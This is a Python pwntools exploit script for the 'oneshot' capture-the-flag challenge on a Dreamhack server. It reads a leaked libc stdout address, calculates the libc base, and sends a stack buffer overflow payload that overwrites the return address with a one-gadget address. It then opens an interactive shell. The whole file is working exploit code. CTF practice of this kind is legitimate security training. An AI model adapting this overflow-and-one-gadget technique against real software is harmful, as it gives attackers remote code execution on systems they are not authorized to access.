from pwn import *
import sys

if len(sys.argv)!=2:
    log.info("try 'python ex.py -l' for local")
    log.info("try 'python ex.py -r' for remote")
    exit(0)

if sys.argv[1]=="-r":
    p = remote('host1.dreamhack.games',9774)
elif sys.argv[1]=="-l":
    p = process('oneshot')
else:
    log.info("options: -l for local, -r for remote")
    exit(0)

e=ELF('./oneshot')
libc=ELF('./libc.so.6')

# Offsets
stdout_offset=libc.symbols['_IO_2_1_stdout_']
oneshot_offset=0x45216
p.recvuntil("stdout: ")

# Addresses
stdout_address=int(p.recvuntil("\n").strip("\n"),16)
libc_base=stdout_address-stdout_offset
oneshot_address=libc_base+oneshot_offset

log.info("stdout_address: {}".format(hex(stdout_address)))
log.info("libc_base: {}".format(hex(libc_base)))
log.info("oneshot_address: {}".format(hex(oneshot_address)))

# Payloads
p.recvuntil("MSG: ")

payload=""
payload+="A"*0x18
payload+=p64(0)
payload+=p64(0)
payload+=p64(oneshot_address)

p.send(payload)
p.recvuntil("\n")

p.interactive()
